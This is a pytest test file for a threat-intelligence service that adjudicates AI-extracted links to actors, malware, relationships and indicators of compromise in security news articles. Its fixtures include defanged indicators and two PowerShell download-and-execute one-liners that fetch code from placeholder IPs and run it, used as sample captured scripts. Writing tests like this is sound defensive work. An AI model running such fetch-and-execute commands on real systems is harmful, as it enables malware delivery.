"""Adjudicate stage (commit 2): gates, manifest, verdict validation, shadow writes."""

import uuid
from datetime import UTC, datetime

import pytest
import pytest_asyncio
from sqlalchemy import func, select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.ai_analysis import AIAnalysisRequest
from app.models.entity_link_validation_log import EntityLinkValidationLog
from app.models.entity_maintenance import EntityMaintenanceLog
from app.models.entity_relationship import EntityRelationship
from app.models.entry import Entry
from app.models.entry_sector import EntrySector
from app.models.feed import Feed
from app.models.malware_family import EntryMalware, MalwareFamily
from app.models.pending_autolink import PendingAutolinkMatch
from app.models.sector import Sector
from app.models.system_setting import SystemSettings
from app.models.threat_actor import EntryThreatActor, ThreatActor
from app.models.tool import EntryTool, Tool
from app.models.ttp import TTP, EntryTTP
from app.services import entry_adjudication as adj
from app.services.entry_adjudication import (
    ACTION_EDGE_DEMOTE,
    ACTION_IOC_DROP,
    ACTION_MERGE,
    ACTION_UNLINK,
    ACTION_VETO,
    ReviewItem,
    _validate_verdicts,
    apply_verdicts,
    build_manifest,
    enqueue_adjudication,
)


@pytest.fixture(autouse=True)
def _reset_settings_cache(monkeypatch):
    import app.services.system_settings as ss_mod

    monkeypatch.setattr(ss_mod, "_cache", None)
    monkeypatch.setattr(ss_mod, "_cache_ts", 0.0)
    yield


_REAL_BUDGET = adj._consume_hour_budget
_REAL_BREAKER = adj._rolling_breaker


class FakeRedis:
    """The handful of commands the budget and breaker use, in memory."""

    def __init__(self):
        self.kv: dict[str, str] = {}
        self.lists: dict[str, list[str]] = {}

    async def get(self, key):
        return self.kv.get(key)

    async def set(self, key, value, ex=None):
        self.kv[key] = str(value)
        return True

    async def incr(self, key):
        self.kv[key] = str(int(self.kv.get(key) or 0) + 1)
        return int(self.kv[key])

    async def expire(self, key, ttl):
        return True

    async def lpush(self, key, value):
        self.lists.setdefault(key, []).insert(0, str(value))
        return len(self.lists[key])

    async def ltrim(self, key, start, stop):
        self.lists[key] = self.lists.get(key, [])[start : stop + 1]
        return True

    async def lrange(self, key, start, stop):
        return self.lists.get(key, [])[start : stop + 1]


def _use_fake_redis(monkeypatch) -> FakeRedis:
    import app.services.redis_client as rc

    fake = FakeRedis()

    async def _get():
        return fake

    monkeypatch.setattr(rc, "get_redis", _get)
    monkeypatch.setattr(adj, "_consume_hour_budget", _REAL_BUDGET)
    monkeypatch.setattr(adj, "_rolling_breaker", _REAL_BREAKER)
    return fake


@pytest.fixture(autouse=True)
def _no_redis(monkeypatch):
    """Budget + breaker touch Redis; stub them so tests are DB-only."""

    async def _always_fits(max_per_hour: int, *, backfill: bool = False) -> str | None:
        return None

    async def _never_trips(ratio: float, pct: float) -> bool:
        return False

    monkeypatch.setattr(adj, "_consume_hour_budget", _always_fits)
    monkeypatch.setattr(adj, "_rolling_breaker", _never_trips)


@pytest_asyncio.fixture
async def feed(db_session) -> Feed:
    f = Feed(title="Warlock Feed", url="https://adj.example/feed", feed_type="rss")
    db_session.add(f)
    await db_session.flush()
    return f


ARTICLE = (
    "The Warlock ransomware crew, which some trackers call Warlock Group, claimed Water Utility Co "
    "on its leak site this week after the utility reported outages it first blamed on the storm.\n\n"
    "Defenders should watch for Cobalt Strike beacons. Full indicators are on our blog at "
    "blog.vendor-research.example."
)


async def _seed_settings(db_session, **overrides):
    values = {"adjudication_mode": "shadow", "adjudication_trigger": "all", **overrides}
    db_session.add(SystemSettings(id=1, settings=values, secrets={}))
    await db_session.flush()


async def _make_entry(db_session, feed, *, score=0.6) -> Entry:
    entry = Entry(
        feed_id=feed.id,
        title="Warlock Ransomware Attackers Hit Water and Energy Utilities",
        guid=f"guid-{uuid.uuid4()}",
        content_text=ARTICLE,
        published_at=datetime.now(UTC),
        priority_score=score,
    )
    db_session.add(entry)
    await db_session.flush()
    return entry


async def _request(db_session, entry, status="completed") -> AIAnalysisRequest:
    row = AIAnalysisRequest(
        entry_id=entry.id, status=status, custom_id=f"ea-{entry.id}", completed_at=datetime.now(UTC)
    )
    db_session.add(row)
    await db_session.flush()
    return row


async def _link_actor(db_session, entry, name, *, source="auto_link", minted=False, article_count=3, aliases=None):
    actor = ThreatActor(
        name=name,
        aliases=aliases or [],
        article_count=article_count,
        created_from_entry_id=entry.id if minted else None,
        created_via="ai_extraction" if minted else None,
    )
    db_session.add(actor)
    await db_session.flush()
    db_session.add(
        EntryThreatActor(
            entry_id=entry.id,
            threat_actor_id=actor.id,
            confidence="medium",
            source=source,
            matched_names=[name],
            paragraph_indices=[2],
            extracted_at=datetime.now(UTC),
        )
    )
    await db_session.flush()
    return actor


def _payload(**overrides) -> dict:
    base = {"summary": "s", "threat_actors": [], "malware": [], "tools": []}
    base.update(overrides)
    return base


# ------------------------------------------------------------------ gates


@pytest.mark.asyncio
async def test_enqueue_off_records_skip(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="off")
    entry = await _make_entry(db_session, feed)
    row = await _request(db_session, entry)
    assert await enqueue_adjudication(db_session, entry.id, {}, _payload()) == adj.SKIPPED_OFF
    assert row.adjudication_status == adj.SKIPPED_OFF


@pytest.mark.asyncio
async def test_enqueue_all_trigger_is_pending(db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    row = await _request(db_session, entry)
    assert await enqueue_adjudication(db_session, entry.id, {}, _payload()) == adj.PENDING
    assert row.adjudication_status == adj.PENDING


@pytest.mark.asyncio
async def test_enqueue_echo_skipped(db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    await _request(db_session, entry, status="reused_echo")
    status = await enqueue_adjudication(db_session, entry.id, {}, _payload(_reused_from=str(uuid.uuid4())))
    assert status == adj.SKIPPED_ECHO


@pytest.mark.asyncio
async def test_enqueue_created_trigger_needs_something_new(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_trigger="created")
    entry = await _make_entry(db_session, feed)
    await _request(db_session, entry)
    # Only an autolinker link to an established entity: nothing new.
    await _link_actor(db_session, entry, "Warlock")
    assert await enqueue_adjudication(db_session, entry.id, {}, _payload()) == adj.SKIPPED_NOTHING_NEW
    # A minted entity on the same entry flips it.
    await _link_actor(db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1)
    entry2 = await _make_entry(db_session, feed)
    await _request(db_session, entry2)
    await _link_actor(db_session, entry2, "Nightspire", source="ai", minted=True, article_count=1)
    assert await enqueue_adjudication(db_session, entry2.id, {}, _payload()) == adj.PENDING
    # Counts from store_entry_analysis count too, without any DB lookup.
    entry3 = await _make_entry(db_session, feed)
    await _request(db_session, entry3)
    assert await enqueue_adjudication(db_session, entry3.id, {"relationships": 1}, _payload()) == adj.PENDING


@pytest.mark.asyncio
async def test_enqueue_score_floor(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_min_priority_score=0.5)
    low = await _make_entry(db_session, feed, score=0.08)
    await _request(db_session, low)
    assert await enqueue_adjudication(db_session, low.id, {}, _payload()) == adj.SKIPPED_SCORE
    high = await _make_entry(db_session, feed, score=0.62)
    await _request(db_session, high)
    assert await enqueue_adjudication(db_session, high.id, {}, _payload()) == adj.PENDING


@pytest.mark.asyncio
async def test_enqueue_budget_exhausted_waits(db_session: AsyncSession, feed, monkeypatch):
    await _seed_settings(db_session)

    async def _full(max_per_hour: int, *, backfill: bool = False) -> str | None:
        return "budget"

    monkeypatch.setattr(adj, "_consume_hour_budget", _full)
    entry = await _make_entry(db_session, feed)
    await _request(db_session, entry)
    assert await enqueue_adjudication(db_session, entry.id, {}, _payload()) == adj.SKIPPED_BUDGET


@pytest.mark.asyncio
async def test_enqueue_creates_request_row_for_manual_runs(db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    assert await enqueue_adjudication(db_session, entry.id, {}, _payload()) == adj.PENDING
    row = (
        await db_session.execute(select(AIAnalysisRequest).where(AIAnalysisRequest.entry_id == entry.id))
    ).scalar_one()
    assert row.status == "completed" and row.adjudication_status == adj.PENDING


# ------------------------------------------------------------------ manifest


@pytest.mark.asyncio
async def test_manifest_lists_links_with_provenance_and_candidates(db_session: AsyncSession, feed):
    entry = await _make_entry(db_session, feed)
    # The catalogue already holds Warlock as malware with 14 articles.
    warlock = MalwareFamily(name="Warlock", aliases=["Warlock Ransomware"], article_count=14)
    db_session.add(warlock)
    await db_session.flush()
    db_session.add(
        EntryMalware(
            entry_id=entry.id,
            malware_family_id=warlock.id,
            confidence="high",
            source="auto_link",
            matched_names=["Warlock"],
            paragraph_indices=[2],
            extracted_at=datetime.now(UTC),
        )
    )
    # An established actor already carries "Warlock Group" as an alias, so the
    # exact/alias matcher must surface it as a merge candidate.
    crew = ThreatActor(name="Warlock Crew", aliases=["Warlock Group"], article_count=9)
    db_session.add(crew)
    await db_session.flush()
    # The analysis minted a duplicate actor and a victim-as-actor.
    group = await _link_actor(db_session, entry, "Warlock Group", source="ai", minted=True, article_count=1)
    victim = await _link_actor(db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1)
    # And promoted a dictionary-word actor from the pending tier.
    storm = await _link_actor(db_session, entry, "Storm", source="auto_link")
    db_session.add(
        PendingAutolinkMatch(
            entry_id=entry.id,
            entity_type="threat_actor",
            entity_id=storm.id,
            canonical_name="Storm",
            matched_names=["storm"],
            paragraph_indices=[2],
            confidence="medium",
            source_weight=1.0,
            resolved_at=datetime.now(UTC),
            resolution="promoted",
        )
    )
    await db_session.flush()
    items, block = await build_manifest(db_session, entry, _payload())
    by_id = {it.item_id: it for it in items}

    w = by_id[f"link:malware:{warlock.id}"]
    assert w.source == "auto_link" and not w.minted_here
    assert "autolinker" in w.line and "14 articles" in w.line and "Warlock ransomware crew" in w.line

    g = by_id[f"link:threat_actor:{group.id}"]
    assert g.minted_here
    assert "NEW, created by this article" in g.line
    assert any(c["name"] == "Warlock Crew" for c in g.candidates)
    assert "nearest existing names: Warlock Crew (threat_actor, 9 articles)" in g.line
    assert all(c["entity_id"] != str(group.id) for c in g.candidates)

    v = by_id[f"link:threat_actor:{victim.id}"]
    assert v.minted_here and "nearest existing names: none" in v.line

    s = by_id[f"link:threat_actor:{storm.id}"]
    assert s.promoted and "pending tier" in s.line
    assert "pending match: surface form(s) storm · autolinker confidence medium" in s.line
    assert block.count("\n") >= 4


@pytest.mark.asyncio
async def test_manifest_marks_inferred_sector_without_a_context_line(db_session: AsyncSession, feed):
    # The analysis links sectors on meaning. The word's first literal
    # occurrence (here, the title) says nothing about why it was linked.
    entry = await _make_entry(db_session, feed)
    energy = Sector(slug="energy-test", name="Energy Test", aliases=["energy"], article_count=40)
    db_session.add(energy)
    await db_session.flush()
    db_session.add(
        EntrySector(entry_id=entry.id, sector="energy-test", sector_id=energy.id, confidence="high", source="ai")
    )
    await db_session.flush()
    items, _ = await build_manifest(db_session, entry, _payload())
    s = next(it for it in items if it.entity_type == "sector")
    assert "inferred by the analysis" in s.line
    assert "context:" not in s.line


@pytest.mark.asyncio
async def test_restore_relinks_a_sector_from_a_snapshot_without_its_slug(db_session: AsyncSession, feed):
    # entry_sectors keys on (entry_id, sector); older unlink snapshots only
    # carry confidence/source, so the slug comes from the Sector row.
    from app.services.entry_adjudication import _relink

    entry = await _make_entry(db_session, feed)
    health = Sector(slug="health-test", name="Health Test", aliases=[], article_count=3)
    db_session.add(health)
    await db_session.flush()
    assert await _relink(db_session, "sector", entry.id, health.id, {"confidence": "high", "source": "ai"})
    await db_session.flush()
    row = (await db_session.execute(select(EntrySector).where(EntrySector.entry_id == entry.id))).scalar_one()
    assert (row.sector, row.sector_id) == ("health-test", health.id)


@pytest.mark.asyncio
async def test_manifest_edges_and_ai_iocs(db_session: AsyncSession, feed):
    entry = await _make_entry(db_session, feed)
    warlock = await _link_actor(db_session, entry, "Warlock", source="ai")
    cobalt = Tool(name="Cobalt Strike", article_count=40)
    db_session.add(cobalt)
    await db_session.flush()
    db_session.add(
        EntityRelationship(
            source_type="threat_actor",
            source_id=warlock.id,
            target_type="tool",
            target_id=cobalt.id,
            relationship_type="uses",
            confidence="probable",
            source="auto_extracted",
            description="Defenders should watch for Cobalt Strike beacons",
            evidence_entry_ids=[entry.id],
        )
    )
    entry.observable_candidates = [
        {"kind": "domain", "value": "cdn.vendor-research.net", "origin": "ai", "evidence": "our blog"},
        {"kind": "ipv4", "value": "10.0.0.1", "origin": "scan"},
    ]
    await db_session.flush()

    # Not the reviewer's to judge: an analyst's edge, and edges whose verdict
    # is already settled — a later co-mention must not undo three keeps.
    mimikatz = Tool(name="Mimikatz", article_count=90)
    db_session.add(mimikatz)
    await db_session.flush()
    for src, verdict, verb in (
        ("analyst_confirmed", None, "uses"),
        ("auto_extracted", "corroborated", "drops"),
        ("auto_extracted", "coincidental", "delivers"),
    ):
        db_session.add(
            EntityRelationship(
                source_type="threat_actor",
                source_id=warlock.id,
                target_type="tool",
                target_id=mimikatz.id,
                relationship_type=verb,
                confidence="confirmed" if verdict == "corroborated" else "possible",
                source=src,
                adjudication_verdict=verdict,
                evidence_entry_ids=[entry.id],
            )
        )
    await db_session.flush()

    items, block = await build_manifest(db_session, entry, _payload())
    kinds = {it.kind for it in items}
    assert {"link", "edge", "ioc"} <= kinds
    edges = [it for it in items if it.kind == "edge"]
    assert len(edges) == 1
    edge = edges[0]
    assert "Warlock uses Cobalt Strike" in edge.line and "Defenders should watch" in edge.line
    iocs = [it for it in items if it.kind == "ioc"]
    # the private address fails today's validators, so it is judged without a review
    assert [it.ioc_value for it in iocs] == ["cdn.vendor-research.net"]
    assert "CANDIDATE: staged by the analysis" in iocs[0].line
    assert [c["value"] for c in entry.observable_candidates if c.get("reviewed")] == ["10.0.0.1"]


# ------------------------------------------------------------------ validation


def _item(item_id, kind="link", minted=False, candidates=None, entity_type="threat_actor"):
    return ReviewItem(
        item_id=item_id,
        kind=kind,
        line="",
        entity_type=entity_type,
        entity_id=uuid.uuid4(),
        name=item_id,
        minted_here=minted,
        candidates=candidates or [],
    )


def test_validate_matrix_and_defaults():
    items = [
        _item("link:threat_actor:a"),
        _item(
            "link:threat_actor:b",
            minted=True,
            candidates=[
                {
                    "name": "Warlock",
                    "aliases": ["Warlock Ransomware"],
                    "entity_type": "malware",
                    "entity_id": "x",
                    "article_count": 14,
                }
            ],
        ),
        _item("edge:1", kind="edge"),
        _item("ioc:domain:x", kind="ioc"),
    ]
    result = {
        "verdicts": [
            {"item_id": "link:threat_actor:a", "verdict": "veto", "confidence": "high", "reason": "not minted here"},
            {
                "item_id": "link:threat_actor:b",
                "verdict": "merge",
                "confidence": "high",
                "merge_into": "warlock ransomware",
            },
            {"item_id": "edge:1", "verdict": "remove", "confidence": "high"},
            {"item_id": "ioc:domain:x", "verdict": "drop", "confidence": "medium"},
            {"item_id": "link:nope", "verdict": "remove"},
        ]
    }
    verdicts, stats = _validate_verdicts(result, items)
    by = {v.item.item_id: v for v in verdicts}
    assert by["link:threat_actor:a"].verdict == "keep"  # veto only on minted entities
    assert by["link:threat_actor:b"].verdict == "merge" and by["link:threat_actor:b"].merge_target["name"] == "Warlock"
    assert by["edge:1"].verdict == "keep"  # remove is not an edge verdict
    assert by["ioc:domain:x"].verdict == "drop"
    assert stats["unknown"] == 1


def test_validate_counts_new_entities_the_reviewer_skipped():
    """Every entity this article minted needs a verdict; one left out is a keep
    but shows in the stats, so a model that ignores the rule is visible."""
    items = [
        _item("link:threat_actor:answered", minted=True),
        _item("link:malware:skipped", minted=True, entity_type="malware"),
        _item("link:tool:established"),
    ]
    result = {"verdicts": [{"item_id": "link:threat_actor:answered", "verdict": "keep", "confidence": "high"}]}
    verdicts, stats = _validate_verdicts(result, items)
    assert stats["new_unanswered"] == 1
    assert all(v.verdict == "keep" for v in verdicts)


def test_validate_merge_to_unlisted_name_is_keep_and_duplicates_void_all():
    item = _item(
        "link:threat_actor:b",
        minted=True,
        candidates=[{"name": "Warlock", "aliases": [], "entity_type": "malware", "entity_id": "x", "article_count": 1}],
    )
    verdicts, _ = _validate_verdicts(
        {"verdicts": [{"item_id": item.item_id, "verdict": "merge", "merge_into": "Scattered Spider"}]}, [item]
    )
    assert verdicts[0].verdict == "keep"

    other = _item("link:threat_actor:c")
    verdicts, stats = _validate_verdicts(
        {
            "verdicts": [
                {"item_id": other.item_id, "verdict": "remove", "confidence": "high"},
                {"item_id": other.item_id, "verdict": "keep"},
            ]
        },
        [other],
    )
    assert stats["duplicate"] and verdicts[0].verdict == "keep"


def test_validate_voids_one_reason_copied_onto_several_links():
    items = [_item(f"link:sector:{n}", entity_type="sector") for n in "abc"] + [
        _item("link:vendor:d", entity_type="vendor")
    ]
    for it, name in zip(items, ("Energy", "Finance", "Retail"), strict=False):
        it.name = name
    # Each sector is named, so only the copying voids them.
    pasted = "A 'Related' link about Tailscale patching names Energy, Finance and Retail, not the victims."
    verdicts, stats = _validate_verdicts(
        {
            "verdicts": [
                *(
                    {"item_id": f"link:sector:{n}", "verdict": "remove", "confidence": "high", "reason": pasted}
                    for n in "abc"
                ),
                {
                    "item_id": "link:vendor:d",
                    "verdict": "remove",
                    "confidence": "high",
                    "reason": "link:vendor:d is an ad banner only.",
                },
            ]
        },
        items,
    )
    by = {v.item.item_id: v.verdict for v in verdicts}
    assert [by[f"link:sector:{n}"] for n in "abc"] == ["keep"] * 3
    assert by["link:vendor:d"] == "remove"  # its own reason stands
    assert stats["copied_reason"] == 3


def test_validate_bad_alias_only_for_a_matched_alias():
    item = ReviewItem(
        item_id="link:threat_actor:c24",
        kind="link",
        line="",
        entity_type="threat_actor",
        entity_id=uuid.uuid4(),
        name="crypto24",
        matched_names=["crypto"],
    )

    def bad_alias_for(value):
        verdicts, _ = _validate_verdicts(
            {
                "verdicts": [
                    {
                        "item_id": item.item_id,
                        "verdict": "remove",
                        "confidence": "high",
                        "reason": "'crypto' is the donation footer, not crypto24.",
                        "bad_alias": value,
                    }
                ]
            },
            [item],
        )
        return verdicts[0].bad_alias

    assert bad_alias_for("Crypto") == "crypto"  # the form as matched
    assert bad_alias_for("crypto24") is None  # never the name itself
    assert bad_alias_for("bitcoin") is None  # not a form this link matched on
    assert bad_alias_for("") is None


@pytest.mark.asyncio
async def test_remove_with_bad_alias_files_an_alias_proposal_once(db_session: AsyncSession):
    actor = ThreatActor(name="crypto24", aliases=["crypto"], article_count=50)
    db_session.add(actor)
    await db_session.flush()
    item = ReviewItem(
        item_id=f"link:threat_actor:{actor.id}",
        kind="link",
        line="",
        entity_type="threat_actor",
        entity_id=actor.id,
        name="crypto24",
        matched_names=["crypto"],
    )
    proposal = await adj._bad_alias_proposal(db_session, item, "crypto", "donation footer")
    assert proposal is not None
    before, after = proposal
    assert after == {"kind": "adjudicator", "bad_alias": "crypto", "reason": "donation footer"}
    db_session.add(
        EntityMaintenanceLog(
            entity_type="threat_actor",
            entity_id=actor.id,
            action=adj.ACTION_ALIAS,
            mode="shadow",
            before=before,
            after=after,
            applied=False,
        )
    )
    await db_session.flush()
    # A second article blaming the same alias adds nothing; an alias the
    # entity does not carry is never proposed.
    assert await adj._bad_alias_proposal(db_session, item, "crypto", "again") is None
    assert await adj._bad_alias_proposal(db_session, item, "bitcoin", "r") is None


def test_validate_voids_one_reason_copied_onto_several_ioc_drops_and_edges():
    iocs = [_item(f"ioc:domain:{n}", kind="ioc") for n in "abc"]
    edges = [_item(f"edge:{n}", kind="edge") for n in "abc"]
    pasted = "This is an indicator of compromise printed defanged; use drop."
    verdicts, _ = _validate_verdicts(
        {
            "verdicts": [
                *({"item_id": i.item_id, "verdict": "drop", "confidence": "high", "reason": pasted} for i in iocs),
                *({"item_id": e.item_id, "verdict": "demote", "confidence": "high", "reason": pasted} for e in edges),
            ]
        },
        iocs + edges,
    )
    assert {v.verdict for v in verdicts} == {"keep"}
    assert not any(v.explicit for v in verdicts)  # a voided demote is no corroborating keep


def test_validate_reclassify_reason_must_name_the_item():
    # The model paired a verdict about 'SHA-256' with the RHEL item; converting
    # RHEL to a tool on that would be wrong everywhere it is linked.
    rhel = ReviewItem(
        item_id="link:product:rhel",
        kind="link",
        line="",
        entity_type="product",
        entity_id=uuid.uuid4(),
        name="Red Hat Enterprise Linux",
        matched_names=["RHEL"],
    )
    verdicts, _ = _validate_verdicts(
        {
            "verdicts": [
                {
                    "item_id": rhel.item_id,
                    "verdict": "reclassify",
                    "suggested_type": "tool",
                    "confidence": "high",
                    "reason": "The term 'SHA-256' refers to the cryptographic algorithm (tool), not a product.",
                }
            ]
        },
        [rhel],
    )
    assert verdicts[0].verdict == "keep"
    verdicts, _ = _validate_verdicts(
        {
            "verdicts": [
                {
                    "item_id": rhel.item_id,
                    "verdict": "reclassify",
                    "suggested_type": "vendor",
                    "reason": "RHEL is named here as the company.",
                }
            ]
        },
        [rhel],
    )
    assert verdicts[0].verdict == "reclassify"  # a matched form counts


def test_validate_remove_and_demote_reasons_must_name_their_item():
    # Reasons pasted onto the wrong row: a MANTLEMAZE → Cairn demote that
    # explains Warlock; a VMware NSX unlink that talks about Infoblox.
    edge = ReviewItem(
        item_id="edge:m",
        kind="edge",
        line="",
        name="MANTLEMAZE uses Cairn (malware)",
        edge_id=uuid.uuid4(),
        forms=["MANTLEMAZE", "Cairn"],
    )
    nsx = ReviewItem(
        item_id="link:product:nsx",
        kind="link",
        line="",
        entity_type="product",
        entity_id=uuid.uuid4(),
        name="VMware NSX",
        matched_names=["NSX"],
    )
    ttp = ReviewItem(
        item_id="link:ttp:t",
        kind="link",
        line="",
        entity_type="ttp",
        entity_id=uuid.uuid4(),
        name="T1059.001 PowerShell",
        matched_names=["the loader runs a PowerShell one-liner"],
        forms=["T1059.001", "PowerShell"],
    )

    def verdicts_for(reasons):
        out, stats = _validate_verdicts(
            {
                "verdicts": [
                    {"item_id": it.item_id, "verdict": v, "confidence": "high", "reason": r}
                    for it, v, r in zip((edge, nsx, ttp), ("demote", "remove", "remove"), reasons, strict=True)
                ]
            },
            [edge, nsx, ttp],
        )
        return out, stats

    wrong, stats = verdicts_for(
        [
            "The sentence only says Warlock ransomware was deployed.",
            "Infoblox Threat Defense is the product discussed, not this one.",
            "",
        ]
    )
    assert [v.verdict for v in wrong] == ["keep", "keep", "keep"]
    assert not any(v.explicit for v in wrong)  # a voided demote is no corroborating keep
    assert stats["unnamed_reason"] == 3

    right, stats = verdicts_for(
        [
            "Cairn is never tied to MANTLEMAZE; they share a roundup paragraph.",
            "NSX here is a file extension, not the VMware product.",
            "t1059.001 is only in a footnote link.",
        ]
    )
    assert [v.verdict for v in right] == ["demote", "remove", "remove"]
    assert stats["unnamed_reason"] == 0


def test_reason_names_item_compares_words_not_punctuation():
    item = ReviewItem(item_id="link:malware:n", kind="link", line="", name="NetSupport RAT")
    assert adj._reason_names_item("'NetSupport-RAT' appears only in a Related headline.", item)
    assert not adj._reason_names_item("NetSupport Manager, the admin tool, is meant.", item)


@pytest.mark.parametrize(
    ("reason", "affirms"),
    [
        ("The article explicitly states MANTLEMAZE uses Cairn, validating the edge.", True),
        ("The evidence sentence supports the relationship between Cairn and MANTLEMAZE.", True),
        ("The domain evil.example is a valid indicator listed in the IoC table.", True),
        ("Cairn link should be kept.", True),
        ("Nothing in the article validates the edge between Cairn and MANTLEMAZE.", False),
        ("The article does not support the claim that MANTLEMAZE uses Cairn.", False),
        ("Cairn is a place name. Validating requires a stated use.", True),
        ("Cairn here is a Scottish landmark, not the malware.", False),
        ("The publisher's own domain, not an indicator; only the C2 domains should remain.", False),
        ("It should remain: the article names it.", True),
    ],
)
def test_reason_affirms(reason, affirms):
    assert adj._reason_affirms(reason) is affirms


def test_validate_drops_destructive_verdicts_whose_reason_argues_for_the_record():
    edge = ReviewItem(
        item_id="edge:m", kind="edge", line="", name="c", edge_id=uuid.uuid4(), forms=["MANTLEMAZE", "Cairn"]
    )
    ioc = _item("ioc:domain:evil.example", kind="ioc")
    verdicts, stats = _validate_verdicts(
        {
            "verdicts": [
                {
                    "item_id": edge.item_id,
                    "verdict": "demote",
                    "confidence": "high",
                    "reason": "The article explicitly states MANTLEMAZE uses Cairn, validating the edge.",
                },
                {
                    "item_id": ioc.item_id,
                    "verdict": "drop",
                    "confidence": "high",
                    "reason": "evil.example is a valid indicator in the IoC table.",
                },
            ]
        },
        [edge, ioc],
    )
    assert [v.verdict for v in verdicts] == ["keep", "keep"]
    assert not any(v.explicit for v in verdicts)
    assert stats["affirming_reason"] == 2


@pytest.mark.parametrize(
    "reason, kept",
    [
        (
            "The article is a promotional piece about Microsoft Defender for Endpoint; linking it implies the"
            " software is an adversary, which contradicts it being a defensive product.",
            True,
        ),
        ("Microsoft Defender for Endpoint is a legitimate security product, not an attacker tool.", True),
        ("Microsoft Defender for Endpoint is the victim environment the malware runs in.", True),
        ("Microsoft Defender for Endpoint appears only in a 'Related:' headline at the foot of the page.", False),
        ("Microsoft Defender for Endpoint is named only in the author bio, not as a threat actor.", False),
        (
            "The article mentions 'Microsoft Defender for Endpoint' only as a security product being disabled by"
            " malware, not as a tool being abused or a threat actor.",
            True,
        ),
        ("Microsoft Defender for Endpoint appears only as a target of credential theft, not as an adversary.", True),
        ("Microsoft Defender for Endpoint appears only in an advert at the end, not as an adversary.", False),
    ],
)
def test_a_link_remove_argued_from_the_entity_being_a_defender_is_voided(reason, kept):
    item = ReviewItem(
        item_id="link:product:mde",
        kind="link",
        line="",
        entity_type="product",
        entity_id=uuid.uuid4(),
        name="Microsoft Defender for Endpoint",
    )
    verdicts, stats = _validate_verdicts(
        {"verdicts": [{"item_id": item.item_id, "verdict": "remove", "confidence": "high", "reason": reason}]},
        [item],
    )
    assert verdicts[0].verdict == ("keep" if kept else "remove")
    assert stats["bystander_reason"] == (1 if kept else 0)


# ------------------------------------------------------------------ where an item sits

IOC_ARTICLE = """The campaign used a loader. Note: re-fang 45.77.12[.]9 only in VirusTotal or MISP.

The dropper was saved as T1059.001-run.ps1 before the payload ran, a step we describe at length below so that this
paragraph is long enough to read as prose rather than a list of indicators.

## Indicators of Compromise

Indicator | Type | Description
45.77.12[.]9 | IPv4 | C2 server
hxxps://evil-cdn[.]com/a.php | URL | payload host

## Sample hashes

- 5d41402abc4b2a76b9719d911017c592
- 7d793037a0760186574b0282f2f435e7

## MITRE ATT&CK

Tactic | Technique | ID
Execution | PowerShell | T1059.001
"""


def test_ioc_where_prefers_the_indicator_table_row_over_the_first_mention():
    # The first literal occurrence is the "re-fang only in VirusTotal" note;
    # the item line must point at the IoC table instead, defanged form found.
    where = adj._ioc_where(IOC_ARTICLE, "45.77.12.9", None)
    assert 'table row under "Indicators of Compromise"' in where
    assert "the article's indicator section" in where
    assert '"45.77.12[.]9 | IPv4 | C2 server"' in where
    assert "table header: Indicator | Type | Description" in where
    url = adj._ioc_where(IOC_ARTICLE, "https://evil-cdn.com/a.php", None)
    assert "hxxps://evil-cdn[.]com/a.php | URL | payload host" in url


def test_ioc_where_finds_a_hash_list_line_and_says_nothing_when_absent():
    where = adj._ioc_where(IOC_ARTICLE, "5d41402abc4b2a76b9719d911017c592", None)
    assert 'list item under "Sample hashes"' in where
    assert adj._ioc_where(IOC_ARTICLE, "0" * 64, None) == ""
    # A value is a whole token: a hash prefix inside a longer hex string is no match.
    assert adj._ioc_where(IOC_ARTICLE, "5d41402abc4b2a76", None) == ""


def test_ttp_listed_in_attack_table_not_the_file_name():
    pattern = adj._technique_pattern("T1059.001")
    row = adj._locate(IOC_ARTICLE, [pattern], structured_only=True)
    assert row.startswith('table row under "MITRE ATT&CK"')
    assert '"Execution | PowerShell | T1059.001"' in row
    # Prose only (the file name) is not a listing.
    assert adj._locate(IOC_ARTICLE.split("## Indicators")[0], [pattern], structured_only=True) == ""
    # A parent technique finds its sub-technique row; a different id does not.
    assert adj._locate(IOC_ARTICLE, [adj._technique_pattern("T1059")], structured_only=True)
    assert adj._locate(IOC_ARTICLE, [adj._technique_pattern("T1003")], structured_only=True) == ""
    assert adj._technique_pattern("not an id") is None


def test_script_lines_carry_the_code_not_just_the_hash():
    code = "$c = New-Object Net.WebClient\n$c.DownloadString('http://198.51.100.7/s.ps1') | iex"
    text = "The stager:\n\n$c = New-Object Net.WebClient\n$c.DownloadString('http://198.51.100.7/s.ps1') | iex\n"
    lines = adj._script_lines(text, code, "stager", "powershell")
    assert 'script (powershell) "stager": "$c = New-Object Net.WebClient $c.DownloadString(' in lines
    assert 'found in: line of its own: "$c = New-Object Net.WebClient"' in lines
    assert adj._script_lines(text, "", "stager", None) == '\n    script "stager" (code not stored)'


@pytest.mark.asyncio
async def test_manifest_ioc_and_script_items_carry_their_context(db_session: AsyncSession, feed):
    from app.intelligence.observables import script_identity
    from app.models.observable import EntryObservable, Observable

    entry = await _make_entry(db_session, feed)
    entry.content_text = IOC_ARTICLE
    code = "$c = New-Object Net.WebClient\n$c.DownloadString('http://198.51.100.7/s.ps1') | iex"
    captured_code = "Invoke-WebRequest -Uri http://203.0.113.9/p.bin -OutFile $env:TEMP\\p.exe; Start-Process p.exe"
    ip = Observable(kind="ipv4", value="45.77.12.9", sighting_count=1, article_count=1)
    script = Observable(
        kind="script",
        value=script_identity(captured_code)[0],
        content=captured_code,
        label="downloader",
        language="powershell",
        sighting_count=1,
        article_count=1,
    )
    db_session.add_all([ip, script])
    await db_session.flush()
    db_session.add_all(
        [
            EntryObservable(
                entry_id=entry.id,
                observable_id=ip.id,
                source="ai",
                surface_form="45.77.12[.]9",
                was_defanged=True,
            ),
            EntryObservable(entry_id=entry.id, observable_id=script.id, source="ai"),
        ]
    )
    staged_sha = script_identity(code)[0]
    entry.observable_candidates = [
        {"kind": "script", "value": staged_sha, "surface_form": "stager", "origin": "ai"},
    ]
    await db_session.flush()

    payload = _payload(scripts=[{"code": code, "label": "stager", "language": "powershell"}])
    items, _ = await build_manifest(db_session, entry, payload)
